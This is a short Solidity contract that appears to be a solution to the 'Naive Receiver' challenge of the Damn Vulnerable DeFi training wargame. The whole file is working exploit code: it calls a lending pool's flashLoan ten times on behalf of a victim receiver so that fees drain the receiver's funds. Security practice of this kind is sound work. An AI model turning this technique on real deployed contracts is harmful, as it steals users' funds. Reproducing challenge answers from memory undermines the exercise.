// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";

/**
 * @title Attack
 * @author Damn Vulnerable DeFi Solution 2
 */

contract Attack {
    NaiveReceiverLenderPool pool;
    uint256 public attackBalance;

    function attack(address payable poolAddress, address target) public {
        pool = NaiveReceiverLenderPool(poolAddress);
        //for loop  10 times
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(target, 0 ether);
        }
    }
}
